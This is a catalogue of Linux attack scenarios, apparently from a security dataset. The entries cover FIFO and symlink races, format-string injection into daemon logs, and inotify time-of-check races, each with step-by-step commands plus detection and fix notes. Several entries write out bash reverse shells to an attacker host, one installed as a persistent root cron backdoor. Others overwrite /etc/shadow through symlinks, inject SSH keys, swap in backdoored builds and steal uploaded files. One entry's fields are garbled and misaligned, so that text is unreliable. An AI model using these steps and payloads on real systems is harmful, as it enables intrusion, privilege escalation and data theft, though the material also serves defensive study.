Detection Method: Monitor for LD_PRELOAD usage in env; restrict preload use for root/bin
Solution: Strip LD_PRELOAD in root/SUID binaries; enforce static linking where possible

Title: Race Condition on FIFO Writer
Attack Type: Race in reading from FIFO (named pipe)
Scenario Description: A process opens a FIFO for writing; attacker races to replace it or inject before actual write.
Tools Used: mkfifo, bash, sleep, echo, rm, ln
Attack Steps: Step 1: Victim creates a named pipe (FIFO): mkfifo /tmp/myfifo. Victim writes to it: echo "safe" > /tmp/myfifo. Step 2: Attacker removes /tmp/myfifo just before write and replaces it with symlink: rm /tmp/myfifo; ln -s /etc/passwd /tmp/myfifo. Step 3: When the write command runs, it opens /etc/passwd and writes "safe", corrupting it. Step 4: Alternatively, attacker opens the FIFO for reading before victim, intercepting the data. Step 5: Works only if victim process does not open with O_EXCL or does not check FIFO integrity. Step 6: You can script it with a loop that detects and replaces the FIFO within milliseconds.
Detection Method: Monitor named FIFO creation and link status; detect rapid pipe replacement
Solution: Always validate named pipes before write; use O_EXCL, permissions, and unique naming strategies

Title: Format Injection in FTP Server Banner
Scenario Description: FTP servers like vsftpd log banner messages. If attacker input is logged with %n or %x, this leads to memory access or code execution.
Attack Steps: Step 1: Connect to an FTP server that logs client banners or usernames into logs. Example: ftp target-ip. Step 2: Set your username as %x%x%x%x or %n%n%n%n. Most FTP clients will let you enter arbitrary usernames. Step 3: When you connect, the server writes this to its log file using fprintf(log, "User %s logged in", user_input);. Step 4: If the server doesn’t sanitize the input, %x causes it to dump memory, %n writes to memory, and %s could crash it. Step 5: Check the FTP server’s /var/log/xferlog or similar log file for output containing memory addresses or application crash. Step 6: In vulnerable servers like older ProFTPD or misconfigured vsftpd, this can even result in remote code execution when %n is used to overwrite instruction pointers. Step 7: Exploiters can chain this with reverse shells or privilege escalation.
Vulnerability: Unfiltered user input logged with printf
Impact: Memory leak, remote code execution via logs
Detection Method: Check FTP logs for repeated %x strings or crashes; analyze core dumps or debug traces if the daemon crashes
Solution: Always use snprintf or format-safe logging functions; sanitize usernames and banners before logging
Tags: FTP Banner, Format String, Log Injection, RCE

Title: SNMP Daemon Log Format Bug
Scenario Description: SNMP daemons receive trap messages and log them. If attacker sends %x %x, daemon logs memory content from the stack.
Attack Steps: Step 1: Configure your target to run snmpd (the SNMP daemon). By default, it listens on port 162 for trap messages. Step 2: Create a malicious SNMP trap message using snmptrap with a message field containing %x %x %x %x. Example: snmptrap -v 2c -c public target-ip '' .1.3.6.1.4.1.8072.2.3.0.1 .1.3.6.1.4.1.8072.2.3.2.1 s "%x %x %x %x" Step 3: If the daemon logs the trap with fprintf() using the input directly, the %x sequences will leak memory. Step 4: View /var/log/snmpd.log or use journalctl to inspect logs. You’ll see memory data printed instead of your %x string. Step 5: This is used to leak stack addresses, which can help attackers bypass ASLR or prepare buffer overflow/RCE attacks. Step 6: Repeating this allows remote probing of memory without authentication.
Vulnerability: Format string injection in trap logging
Detection Method: Monitor SNMP logs for malformed trap strings with %x, %n, %p, and analyze memory traces from crashes
Solution: Use safe logging, sanitize SNMP strings before logging; never pass trap values directly into printf()

Title: MTA Log Injection via SMTP Headers
Scenario Description: Mail servers log SMTP headers. If the attacker adds %s, %x, or %n into headers like From:, this causes logging bugs.
Attack Steps: Step 1: Connect to the mail server’s SMTP port: telnet target-ip 25. Step 2: Craft a fake email where MAIL FROM: or HELO: includes %x %x %x. Example: HELO %x%x%x%x. Step 3: Mail Transfer Agent (MTA) logs these headers. If it uses fprintf(log, input), it interprets %x as a format string instead of plain text. Step 4: This leads to leaked stack data in mail logs, or worse, if %n is allowed, it may write to memory. Step 5: Check /var/log/maillog, /var/log/mail.log, or /var/log/messages on the mail server for unexpected memory data. Step 6: Vulnerable MTAs include older versions of Sendmail, Postfix, or Exim with debug logging enabled. Step 7: This could leak usernames, passwords, or be part of a RCE chain.
Vulnerability: Format string injection via SMTP headers
Impact: Mail server memory leak, logging crash
Detection Method: Check logs for format patterns from SMTP inputs; enable alerting for invalid header characters
Solution: Sanitize and escape headers before logging; never use raw headers with printf()
Tags: SMTP Injection, Format Log, MTA Exploit

Title: SSH Daemon Auth Log Format Exploit
Scenario Description: SSH logs failed login attempts. A crafted %s or %x in the username leaks memory or causes segmentation fault in auth logs.
Attack Steps: Step 1: Try to SSH into a server with a fake username containing format strings: ssh %x%x%x@target-ip. Step 2: The server logs the login attempt in /var/log/auth.log using something like fprintf(logfile, "User %s failed login"). Step 3: If the %x is interpreted, the server dumps stack values into the log file. Step 4: If %s or %n is allowed, it may crash sshd or cause a memory write. Step 5: Check /var/log/auth.log for leaked memory or segmentation fault traces. Step 6: This helps an attacker fingerprint system memory, leak addresses, or plan a deeper exploit. Step 7: Most modern OpenSSH versions sanitize this, but older systems with debug or audit patches may still be vulnerable.
Vulnerability: Format strings in auth log paths
Detection Method: Analyze SSH auth logs for format strings; alert on usernames containing % characters
Solution: Sanitize user input before logging; use snprintf, don’t pass raw user input to fprintf()
Tags: SSH Format Bug, Auth Log Injection

Title: Format Bug in TFTP Server Logs
Attack Type: Unchecked format string in log messages
Scenario Description: A TFTP server receives a file request (e.g., filename) and logs it without format sanitization, causing memory exposure or crash.
Attack Steps: Step 1: Connect to a TFTP server with a client like tftp target-ip. Step 2: Send a file request with a filename such as %x%x%x%x: get %x%x%x.txt. Step 3: The server logs this filename. If it uses printf(log, filename);, it interprets %x and reads from memory. Step 4: This leads to leaked memory contents or a crash. Step 5: Check /var/log/daemon.log or syslog for evidence. Step 6: A successful exploit shows raw memory addresses or causes TFTP service to stop. Step 7: Used in embedded or IoT firmware with insecure logging.
Vulnerability: Format string parsing in filename logging
Impact: Memory leak, remote crash of TFTP server
Detection Method: Monitor TFTP logs for format patterns, malformed file names, or crash events
Solution: Replace printf() with snprintf() in logs; validate file names and avoid logging them raw
Tags: TFTP Exploit, Format String in Filename

Title: NFS Daemon Logs Mount Path with Format Specifier
Attack Type: Format string injection in NFS mount path
Scenario Description: NFS servers log incoming mount requests, and if attacker-supplied paths are logged without sanitization, memory leaks may occur.
Attack Steps: Step 1: Identify that NFS daemons (nfsd) log client mount paths for auditing. These logs go to /var/log/messages or /var/log/syslog. Step 2: On your attacking machine, try to mount the NFS server using a crafted path: mount -t nfs target-ip:/%x%x%x /mnt. The %x are format string specifiers that, when logged unsafely, will be interpreted as instructions to read stack memory. Step 3: If the NFS server uses something like fprintf(logfile, path);, it will read and dump memory values instead of printing %x. Step 4: On the server, inspect the log file and you’ll see leaked memory content like hex addresses or garbage binary. Step 5: These leaks can be chained with buffer overflows or used to defeat protections like ASLR. Step 6: Repeat with variations like %s to crash the service or %n to write memory. Step 7: This attack does not require authentication or privileges—just mount permission.
Vulnerability: Format string in mount path logging
Impact: Memory disclosure, DoS via log parsing
Detection Method: Monitor NFS logs for mount paths containing %x, %s, or %n
Solution: Sanitize mount paths before logging; use %s with argument instead of direct insertion in printf

Title: Web Server Logs with %n in URL Field
Attack Type: Format string injection in URL logs
Scenario Description: Web servers often log URLs. If %n is logged without sanitization, it can cause memory writes and possible code execution.
Attack Steps: Step 1: Open your terminal or browser and send a request to the web server with a crafted URL: curl http://target-ip/%n%n%n%n. Step 2: The web server logs every request in its access log (e.g., /var/log/nginx/access.log or /var/log/apache2/access.log). Step 3: If the web server config or custom logging module logs the URL directly into a printf()-style function without escaping, %n is interpreted as a memory write instruction. Step 4: %n attempts to write to an address provided on the stack—this can crash the process or lead to controlled memory corruption if exploited. Step 5: You can try %x%x%x to leak memory instead of write. Step 6: Repeated requests with %n can cause web server crashes, enabling DoS or even RCE in vulnerable modules. Step 7: This attack is silent—there’s no visible output to the user, but logs may show stack trace or segmentation fault.
Vulnerability: Unsafe logging of URL without format escape
Detection Method: Analyze web access logs for special symbols like %, n, x; check server crash reports
Solution: Use structured logging functions; validate and escape all inputs before printing or logging
Tags: Format String, Web Server, URL Injection

Title: Format String Vulnerability in Cron Daemon
Attack Type: Task log injection via stderr or cmd
Scenario Description: Cron daemons log task commands or stderr outputs. Malicious content in task scripts can exploit unsafe logging functions.
Attack Steps: Step 1: As a local user, create a cron job with a command that generates an error containing format strings: * * * * * echo %x%x%x%x >&2. Save with crontab -e. Step 2: Cron daemon executes the job every minute. The stderr (>&2) is captured and logged using fprintf(log, output). Step 3: If the cron logging function does not sanitize the output, it interprets %x as instructions and dumps memory. Step 4: Check the log file /var/log/cron or /var/log/syslog to see raw stack values like memory addresses. Step 5: If %n is used and the system is vulnerable, the attacker may write to memory, leading to privilege escalation or code injection. Step 6: Combine with buffer overflows for full RCE. Step 7: Since cron runs as root, this is a critical escalation vector. Step 8: Clean up using crontab -r when done.
Vulnerability: Format string from stderr or command logs
Impact: Memory leak, RCE, root privilege escalation
Detection Method: Monitor cron logs for format specifiers; alert on %x, %s, %n in output
Solution: Sanitize stderr outputs; use %s and argument variables safely when logging command output

Title: SysV Init Daemon Format Leak
Scenario Description: SysV init systems log startup scripts and arguments; if attacker can influence these with %x, memory may leak.
Attack Steps: Step 1: On systems using SysV Init (older Linux), attackers can place crafted arguments in service start commands. Step 2: Insert a script in /etc/init.d/ that includes a suspicious command: echo %x%x%x > /dev/null. Step 3: Make the script executable and link it to runlevels using update-rc.d. Step 4: During system boot or service restart, the init process logs this command to syslog using unsafe fprintf(). Step 5: Instead of writing %x, it interprets it and prints memory data. Step 6: This data may contain stack variables, pointers, or environment data. Step 7: Check /var/log/messages or dmesg for proof. Step 8: Effective in embedded devices or outdated Linux distros where init scripts are still common.
MITRE Technique: T1543.002 – System Boot or Logon Initialization
Detection Method: Check init logs for %x, %n; audit scripts for unusual arguments
Solution: Sanitize boot arguments; use service wrappers with validated inputs; consider migration to systemd
Tags: SysV Init, Format Injection, Info Leak

Title: Debug Mode Logging in Daemon Exposes Format Bug
Attack Type: Debug mode enables unsafe format logs
Scenario Description: Some daemons enable verbose logging in debug mode, exposing unsanitized attacker input and format bugs.
Attack Steps: Step 1: Locate a daemon running in debug mode (e.g., with --debug, -v, or a debug config flag). Example: daemon --debug or service start --verbose. Step 2: Find input vectors accepted by the daemon—these could be logs, headers, commands, or request payloads. Step 3: Send crafted input like %x%x%x%x through that vector. If the debug mode logs it using printf(input);, the daemon interprets %x and prints memory. Step 4: Check /var/log/debug, /var/log/daemon.log, or stdout output for stack memory values. Step 5: If %n is interpreted, the memory can be overwritten and crash or corrupt process memory. Step 6: Use strace to observe what system calls are being made and detect crashes. Step 7: Debug logs are often more verbose and bypass input sanitization—making them a powerful target.
Vulnerability: Unsafe format string in verbose logging
Impact: Memory leak, process crash, privilege escalation
Detection Method: Enable strict monitoring of debug logs; grep logs for format strings and core dump signatures
Solution: Never log user input directly; disable debug in production; use defensive format-safe wrappers
Tags: Debug Logging, Format Bug, Daemon Memory Leak

Title: DNS Daemon Receives %s in Zone File Query
Attack Type: Format string injection via DNS query
Scenario Description: DNS daemons (like BIND or dnsmasq) log query names. If these include format strings like %s, %x, they are interpreted in logs, leaking memory.
Attack Steps: Step 1: Set up a DNS server running named (BIND) or dnsmasq. These daemons often log DNS query names to /var/log/syslog or /var/log/messages. Step 2: From an attacker machine, send a query with format strings in the domain name using: dig %x%x%x.example.com @target-ip. Step 3: The DNS server logs this query. If it uses fprintf(logfile, queryname);, then %x is interpreted and stack memory is read. Step 4: Check the server’s logs to find memory leak outputs where %x was inserted (look for hexadecimal values). Step 5: You can try %s to trigger potential crashes or %n to cause memory writes depending on implementation. Step 6: This works remotely without needing authentication. Step 7: You can automate with while true; do dig %x%x%x%x.example.com @target-ip; done and scrape logs for useful memory content.
Vulnerability: Unsafe logging of domain query strings
Detection Method: Monitor DNS logs for strange %x, %n, %s patterns in queries; check for crash traces
Solution: Use safe format strings in log functions; validate or escape all domain names before logging
Tags: DNS, Format Injection, Named Memory Leak

Title: CUPS Printer Daemon Log Injection via Job Title
Attack Type: Format string in print job titles
Scenario Description: CUPS logs job titles from user input. Malicious format strings in titles can be interpreted, leaking or overwriting memory.
Attack Steps: Step 1: Use a command like lp -t "%x%x%x%x" test.txt to submit a print job where the job title contains format specifiers. Step 2: CUPS daemon (cupsd) logs this title with something like fprintf(log, title);. Step 3: Instead of writing %x, it prints stack memory. If %n is included, it may cause memory corruption or crash. Step 4: Inspect /var/log/cups/error_log or system logs for the injected values. Step 5: This does not require special privileges; any user with print permission can do it. Step 6: Some CUPS versions also send these logs to journald. Step 7: You can also inject strings via web UI using the job title field if it's exposed. Step 8: Combine with other kernel logging bugs for deeper system attacks.
Impact: Kernel info leak, DoS, potential privilege escalation
Detection Method: Check CUPS error logs for strange print job names; look for segmentation faults or hex output
Solution: Sanitize print job titles; wrap all log messages with static format and validate input

Title: Logrotate or Archiver Daemon Crash
Scenario Description: Archiving or log rotation daemons log file names. If %n or %s is in the name, and used unsafely in logging code, it can crash the daemon.
Attack Steps: Step 1: Create a fake log file with a malicious filename: touch /var/log/%n%n%n.log. Step 2: Configure logrotate to rotate /var/log/*.log. It will pick up the crafted filename. Step 3: If logrotate uses a printf(filename); style logging, it will try to interpret %n and crash while attempting to write to invalid memory. Step 4: Check /var/log/syslog or journal logs for logrotate segmentation faults. Step 5: This can prevent critical logs from rotating or filling up the disk, leading to system DoS. Step 6: This attack does not require root—just write access to a log directory. Step 7: You can also chain this by targeting automated compression daemons or backup jobs using similar naming strategies.
Vulnerability: Format string in file names used in logging
Impact: Crash of log system, blocked logging, full disk
Detection Method: Monitor for unusual filenames with % in /var/log; inspect crash logs from logrotate
Solution: Use snprintf with argument substitution; never log raw filenames directly

Title: IoT Daemon with Format Bug in UART Debug Log
Attack Type: UART debug output uses unsafe printf
Scenario Description: Embedded Linux daemons log debug messages over UART. If format strings are inserted via device input, it leads to memory leaks.
Tools Used: UART cable, screen, socat, IoT board, serial tools
Attack Steps: Step 1: Connect to the IoT device’s serial console using a USB-UART adapter (e.g., via screen /dev/ttyUSB0 115200). Step 2: Identify services on the device that log actions from user input or messages over UART. Step 3: Send crafted input like %x%x%x%x through the UART or inject into a config file that the daemon logs. Step 4: Watch the serial debug output. If the daemon uses printf() unsafely, %x is interpreted, and memory content appears on the serial output. Step 5: Repeated %x reveals more memory; %s may crash the daemon or dump sensitive strings. Step 6: This method can dump firmware variables, kernel pointers, or stack data directly to serial. Step 7: Often found in default factory/debug builds where secure logging is not enforced. Step 8: Combine with local escalation or firmware extraction to gain full root control.
Vulnerability: Unsafe printf in debug UART logs
Impact: Memory dump via UART, full system compromise
Detection Method: Monitor UART output logs; detect format specifiers in device boot output or user responses
Solution: Remove debug mode in production; validate user input passed to logs; avoid printf-style debug printing
Tags: IoT, UART Debug, Format Bug, Memory Leak

Title: TOCTOU Exploit via Inotify
Scenario Description: A file monitored by a system daemon or script can be swapped or changed between when it is checked and when it's actually used.
Tools Used: inotifywait, bash, mv, ln, sleep, watch
Attack Steps: Step 1: Find a system or daemon that monitors a file using inotify (like /etc/cron.d/myjob or /var/tmp/upload.tmp). Step 2: Confirm that the service reads the file after inotify triggers (common in antivirus scans, config reloaders, backup daemons). Step 3: Create your file with harmless content: echo safe > /tmp/file. Start monitoring with: inotifywait -m /tmp/file. Step 4: As soon as the daemon or service reacts to the file event, quickly replace the file with malicious code: echo "malicious payload" > /tmp/file. Use sleep or watch or time delay tactics to match timing. Step 5: If done right, the daemon will use the malicious file, not the safe one, executing your payload or reading unintended data. Step 6: Automate with a loop script that swaps the file on every write/open event to maximize race success.
Impact: Race condition to execute arbitrary code
Detection Method: Monitor timing of file change vs. access; compare file hash pre/post access
Solution: Use file handles not paths; atomic file operations (open(), O_NOFOLLOW); use secure file permissions

Title: Symlink Swap Attack
Scenario Description: Replace a temporary or in-use file with a symlink to a sensitive file before it's opened or written to.
Tools Used: ln, watch, mv, touch, sleep, bash
Attack Steps: Step 1: Find a program (e.g., log cleaner, cron job) that creates or watches files like /tmp/tempfile.tmp. Step 2: Wait for it to start watching the file using inotifywait /tmp/tempfile.tmp. Step 3: Just before it writes to this file, delete it and replace with a symlink: rm /tmp/tempfile.tmp && ln -s /etc/shadow /tmp/tempfile.tmp. Step 4: The program writes to /tmp/tempfile.tmp, thinking it’s a normal file, but it overwrites /etc/shadow via symlink. Step 5: Now you have corrupted a protected system file, possibly enabling privilege escalation or denial of service. Step 6: Works best with world-writable temp files or backup daemons with raceable paths. Step 7: Monitor timing to avoid premature or late swaps.
Vulnerability: Insecure file usage with symlink swap
Impact: Overwrite system files like /etc/shadow, escalate access
Detection Method: Audit for symbolic link usage; monitor access to sensitive files from tmp paths
Solution: Always use O_NOFOLLOW, `O_CREAT
Tags: O_EXCLto block symlink writes; use secure temp file creation (e.g.,mkstemp`)
Source: Symlink Attack, File Overwrite, Temp File Exploit

Title: File Replace Before Copy
Scenario Description: Backup daemons or file sync tools copy a file that attacker can replace in between the time of check and use.
Tools Used: cp, sleep, bash, inotifywait, watch, touch
Attack Steps: Step 1: Submit a legitimate file to a service or upload tool, e.g., touch /tmp/userfile.txt && echo "clean" > /tmp/userfile.txt. Step 2: The backup daemon watches the file for changes using inotify and triggers a copy. Step 3: Between the trigger and the copy, quickly replace the file with a malicious version: echo "malware" > /tmp/userfile.txt. Step 4: The backup system copies the now-malicious file instead of the original clean one. Step 5: This spreads malware, backdoors, or tampered configs silently into backups. Step 6: Works best when file copy is delayed or queued. Step 7: Repeat to infect regular syncs or automate using timing scripts.
Detection Method: Track file hash before and after copy; flag suspicious timing or duplicate writes
Solution: Copy using file handles (not names); implement integrity checks or file-locking mechanisms
Tags: File Injection, Backup Hijack, Race Exploit

Title: Hijack Config Reload via Inotify
Scenario Description: Services like Nginx or Apache monitor config files via inotify. Replacing config just before reload allows malicious directives.
Attack Steps: Step 1: Nginx monitors nginx.conf and reloads on changes (kill -HUP). Place a valid config file initially. Step 2: Admin or script triggers a reload using systemctl reload nginx or SIGHUP. Step 3: Between reload signal and read of file, attacker swaps the config with a malicious one: mv nginx.conf.backdoor /etc/nginx/nginx.conf. Step 4: When Nginx reloads, it reads the new malicious config. Step 5: The backdoored config may open a new port, redirect logs to external server, or serve web shells. Step 6: After use, attacker can replace it with the original config to avoid detection. Step 7: This attack requires timing precision and often succeeds in busy systems.
Detection Method: Monitor reload signals with auditd; hash configs before/after reloads
Solution: Use file descriptor locks or config signature validation before reload
Tags: Config Race, Inotify Reload, Service Hijack

Title: Inject Payload via Log Rotation
Scenario Description: Log daemons often rename .log files before rotating them. If attacker can predict filename, replace it with malicious script.
Attack Steps: Step 1: Wait for logrotate to trigger on /var/log/app.log. It may rename the file to app.log.1 before compressing. Step 2: In between logrotate renaming and compression, quickly replace app.log.1 with a shell script: echo '#!/bin/bash\nbash -i >& /dev/tcp/attacker-ip/4444 0>&1' > /var/log/app.log.1. Step 3: If another tool or cron job executes rotated logs (some do for analysis or notification), your shell script gets executed. Step 4: You now get a reverse shell. Step 5: Monitor logrotate cycles using inotifywait or time prediction (cron time). Step 6: Works well when rotated logs are not cleaned or validated.
Vulnerability: Replace rotated log with executable script
Impact: Remote code execution via rotated log hijack
Detection Method: Track unusual file execute bits in /var/log; alert on rotated files turning into scripts
Solution: Do not execute logs; verify log file types; disable exec permissions on log directories
Tags: Log Hijack, Rotation Injection, Shell via Logs

Title: Inotify Triggered Build Hijack
Attack Type: Build process hijack via watched file
Scenario Description: CI/CD or dev tools monitor files for build trigger. If attacker replaces source file right before compile, malware gets built into binaries.
Tools Used: inotifywait, gcc, make, mv, git, bash
Attack Steps: Step 1: In dev systems, make or custom CI watches files like src/main.c. This triggers builds on modification. Step 2: Attacker places a clean file to pass initial checks. Step 3: Before compilation starts, attacker replaces the file with backdoored source: mv main_backdoor.c src/main.c. Step 4: Build compiles the malicious source into binary (e.g., a trojan). Step 5: The binary may include remote access, logging, or command execution. Step 6: Replace backdoor file with original after build to avoid detection. Step 7: Attack works best in shared folders or if attacker can commit after event trigger.
Vulnerability: Race on build trigger + file replacement
Detection Method: Monitor builds for hash mismatches; log all file access timestamps; trace git changes
Solution: Use immutable build directories; enforce code review before build triggers
Tags: CI/CD Race, Build Hijack, Inotify Trigger

Title: Exploit Time Lag in Antivirus Scanner
Scenario Description: AV tools using inotify scan new files shortly after creation. Attackers exploit this delay to swap a malicious file before AV scans.
Tools Used: inotifywait, sleep, mv, cp, bash, clamav, eset
Attack Steps: Step 1: Create a clean placeholder file: echo "safe" > upload.doc. Step 2: Start monitoring antivirus scan delay using: inotifywait -m ./upload.doc. Step 3: Upload this file to a directory scanned by AV (e.g., ~/Downloads, /tmp/). Step 4: Just after upload and before AV completes its scan (usually 1–3 seconds delay), replace the file with a malicious version: cp malware.doc upload.doc. Step 5: If the swap is fast enough, the AV may not rescan the changed file or mark it clean. Step 6: Confirm by checking AV logs or behavior. If malware persists undetected, the bypass worked. Step 7: Repeat with automated timing using sleep or shell scripts to refine timing. Step 8: Works best on slow systems or busy AV daemons.
Vulnerability: TOCTOU delay between file event and scan
Detection Method: Enable verbose AV logging; monitor modification time vs. scan time
Solution: Force rescan on every file change; use file hashing on every access

Title: Container Escape via Shared Volume Race
Scenario Description: Containers using shared host volume can be tricked into overwriting host files using symlink swaps during inotify-based operations.
Tools Used: docker, ln, inotifywait, bash, mount, sleep
Attack Steps: Step 1: Start a container with a shared bind-mount: docker run -v /hostdir:/data -it ubuntu. Step 2: Inside the container, create a file in /data/output.txt. Step 3: Identify a process (daemon, user, or AV) on the host that watches this file for changes using inotify. Step 4: Just before the file is written or scanned, swap it with a symlink to a sensitive host file: ln -sf /etc/shadow /data/output.txt. Step 5: The host-side tool now accesses or overwrites /etc/shadow, thinking it's working with /data/output.txt. Step 6: This breaks container isolation, giving potential root access. Step 7: Works best if container user has write access to mounted volume and no symlink checks are enforced.
Vulnerability: Unsafe access via symlink in volume mount
MITRE Technique: T1611 – Escape via Host Filesystem Access
Impact: Host file overwrite, container → host privilege escape
Detection Method: Monitor /proc/[pid]/fd from inside and outside container; log unusual file accesses
Solution: Use noexec, nodev, nosuid mount options; verify symlink paths before opening

Title: Crontab Injection via Watched Scripts
Scenario Description: Crons watch a directory and execute updated scripts. Attackers swap a benign file with a cron-dropper script during the race.
Attack Steps: Step 1: In systems with cron-based execution of scripts in /etc/cron.hourly or /usr/local/bin/watchdir/, create a clean script: echo "echo Hello" > watchdir/hello.sh. Step 2: Wait for the system or daemon to trigger script execution (e.g., cron, anacron, systemd). Step 3: Monitor inotify events or time-based patterns. Just before execution, replace hello.sh with a malicious script: echo 'echo "*/1 * * * * root bash -i >& /dev/tcp/attacker-ip/4444 0>&1" > /etc/cron.d/backdoor' > watchdir/hello.sh. Step 4: The cron daemon executes this new script, which installs a persistent reverse shell. Step 5: Remove the dropper and replace original script to stay stealthy.
Impact: Persistent reverse shell or root cron access
Detection Method: Monitor cron.d for new entries; audit inotify-based directory triggers
Solution: Sign scripts; use immutable flags on watched directories; disable script execution from writable locations

Title: SSH Key Drop via .ssh Watcher
Scenario Description: Systems that watch .ssh/authorized_keys for backup or sync can be exploited during race to insert a malicious SSH key.
Attack Steps: Step 1: Create a temporary fake .ssh/authorized_keys file with safe content: echo safe-key > /home/victim/.ssh/authorized_keys. Step 2: Wait for a backup daemon or rsync-like watcher to scan the .ssh folder (check logs, cron timing). Step 3: Between the event detection and sync or backup, quickly replace it with: echo attacker-key > /home/victim/.ssh/authorized_keys. Step 4: The backup service now stores the malicious version or allows its usage if synced across systems. Step 5: Attacker can now log in as that user via SSH without a password. Step 6: Works best if the service doesn’t re-verify file integrity after scan. Step 7: Clean up or reinsert old key to remain undetected.
Impact: SSH access to victim machine (lateral move)
Detection Method: Monitor .ssh for unauthorized key insertions; track inotify logs for rapid key file replacement
Solution: Lock down .ssh files; disallow inotify watching of auth directories; validate key fingerprints regularly
Tags: SSH Lateral Movement, Key Injection, Inotify Race

Title: Auto-Deployment Hijack
Scenario Description: CI/CD systems deploy new uploads automatically. Replacing the artifact after upload triggers remote code execution.
Tools Used: mv, inotifywait, scp, bash, nginx, docker
Attack Steps: Step 1: Upload a safe web or deployment artifact (e.g., WAR, JAR, .zip) to /var/www/deployments/new/. Step 2: The system watches this path via inotify to trigger a deploy (cp, docker build, etc.). Step 3: After upload triggers the watcher but before deployment runs, quickly replace the artifact with a malicious one: mv backdoor.zip /var/www/deployments/new/upload.zip. Step 4: When the CI/CD tool deploys, it uses the backdoored version. Step 5: The attacker gets code execution via webshell, cron, or malware inside the deployed service. Step 6: Works best with auto-deployments or misconfigured triggers with no checksum validation.
Impact: Remote code execution, backdoor in production
Detection Method: Compare hash before and after deployment; monitor fs events in CI pipeline
Solution: Use signed artifacts; validate checksum before unpacking or deploying
Tags: CI/CD Race, Auto Deploy Exploit, RCE

Title: Race in Secure Boot Update Watcher
Scenario Description: OSes watch EFI/boot config files for updates. If attacker swaps config during scan/use, they can inject malicious bootloader.
Attack Steps: Step 1: Identify Secure Boot or UEFI tools that watch /boot/efi/ or /boot/grub/grub.cfg (e.g., Ubuntu’s mokmanager). Step 2: Replace a pending update file with a signed-looking but malicious .efi or config. Step 3: Trigger the update mechanism manually or wait for automatic update. Step 4: The update tool scans the file, sees a clean signature, but before installation the file is replaced. Step 5: Upon reboot, attacker’s EFI payload executes. Step 6: If TPM isn’t enforcing full chain-of-trust, attacker persists with full boot-level control. Step 7: Restore original file after injection to avoid suspicion.
Impact: Persistence at boot level, secure boot bypass
Detection Method: Monitor /boot/efi for rapid file change before boot; verify checksums pre- and post-update
Solution: Enforce TPM-backed full verification; disable inotify on sensitive boot partitions
Tags: UEFI, Secure Boot, TOCTOU Race, Persistent Boot Hijack

Title: Data Theft via Inotify on Upload Folders
Scenario Description: Attackers monitor upload folders using inotify and silently copy uploaded confidential data before it's processed.
Attack Steps: Step 1: Set up inotifywatch on the upload directory (e.g., /var/www/uploads) using: inotifywait -m /var/www/uploads. Step 2: Wait for a user to upload a sensitive file such as a document or image. Step 3: As soon as inotify detects a CREATE or CLOSE_WRITE event, copy the file silently to another location: cp /var/www/uploads/secret.doc /tmp/stolen.doc. Step 4: Repeat the process for every upload. Step 5: Schedule automated exfiltration (e.g., email or SFTP the files to a remote server). Step 6: If uploads are deleted after processing, the attacker retains the stolen copy unnoticed.
Vulnerability: File readable between upload and processing
Detection Method: Enable access audit logs; monitor upload folder access timing
Solution: Encrypt uploaded files immediately; move files to inaccessible temp storage instantly

Title: Privilege Escalation via Script Swap
Scenario Description: Root-level daemons often execute maintenance or install scripts on file triggers. Swapping the script during inotify delay gives root shell.
Tools Used: mv, inotifywait, bash, chmod, cron, systemd
Attack Steps: Step 1: Identify a root cron job or systemd service that executes scripts in /etc/cron.d, /opt/scripts/, or similar folders (e.g., /etc/update-trigger.sh). Step 2: Replace the legitimate script just before execution: mv update.sh update-real.sh && echo '#!/bin/bash\nbash -i >& /dev/tcp/attacker-ip/4444 0>&1' > update.sh. Step 3: Ensure script has exec permission: chmod +x update.sh. Step 4: As daemon runs, the root script executes attacker code. Step 5: After execution, revert script to original to hide traces. Step 6: Automate detection and swap with inotifywait or timed sleep.
MITRE Technique: T1543.003 – Create or Modify System Process
Detection Method: Monitor script hashes before and after execution; enable auditd tracking for script paths
Solution: Sign trusted scripts; use immutability (chattr +i); avoid script-based privilege transitions

Title: Filesystem Overlay Attack
Scenario Description: Overlay filesystems used in containers or live distros can be manipulated after inotify triggers, replacing read-only view with attacker-controlled file.
Attack Steps: Step 1: Set up or target a system using OverlayFS (common in containers, appimages, and Live Linux distros). Step 2: Identify a file in the upper (writable) layer that overlays a read-only lower layer. Step 3: Use inotifywait to detect when the system reads the file (e.g., during update or config reload). Step 4: Between the check and read phase, replace the upper layer file with malicious data (e.g., backdoored binary or altered config). Step 5: The system uses the modified file thinking it's unchanged. Step 6: Allows persistent code injection, config changes, or data poisoning. Step 7: Clean up quickly to maintain stealth.
Detection Method: Compare file content across lower/upper layer; hash upper layers on boot or mount
Solution: Use read-only lower layer verification; disallow writes to sensitive overlay paths

Title: Database Poisoning
Scenario Description: SQLite or flat file-based databases triggered via inotify can be poisoned by attacker just before data access.
Attack Steps: Step 1: Identify an app that reads data from a local SQLite DB (e.g., logs.db) after an inotify event like log write. Step 2: Let app trigger the inotify watcher (e.g., add row to DB). Step 3: Between event and actual database read, attacker replaces the DB file with poisoned version: cp fake.db logs.db. Step 4: This poisoned version may contain attacker-controlled queries, malformed rows, or data used for code injection. Step 5: App reads the tainted DB and executes logic on bad data (e.g., report gen, analytics, user import). Step 6: Attack is stealthy if original DB is restored after use. Step 7: May allow privilege escalation if DB includes roles, credentials, or config.
Detection Method: Log DB integrity hashes; verify schema and query logic; use VACUUM checks
Solution: Lock or sign DB files during access windows; don't trust external DB triggers

Title: Backup Corruption
Scenario Description: Daemons watching files for backups (rsync, cron) can copy attacker-injected versions if timed during TOCTOU window.
Attack Steps: Step 1: Find target folders that are backed up by a cron job or automated rsync (/home/user/important.txt). Step 2: Let backup service watch this path and wait for it to trigger copy (use inotifywait to detect CLOSE_WRITE). Step 3: Just before rsync or cron copies the file, replace it with corrupted content or malware: mv poison.txt /home/user/important.txt. Step 4: The backup system copies the tainted file. Step 5: The corrupted version is now part of backup archives, making recovery unsafe. Step 6: Optionally, revert the file immediately to avoid suspicion. Step 7: Long-term impact is achieved if backup cycles overwrite older safe versions.
Vulnerability: File swapped between check and copy
Impact: Long-term data loss, malware in backups
Detection Method: Backup integrity checksums; log all backup file copies; use immutable snapshot backups
Solution: Snapshot-based backups; use signed archives; validate file state before inclusion in backup
Tags: Backup Race, Corruption, TOCTOU File Injection

Title: Triggering Broken ACL Rewrites
Scenario Description: When inotify triggers cause access control rewrites, attackers can swap in protected files during race to get elevated ACLs.
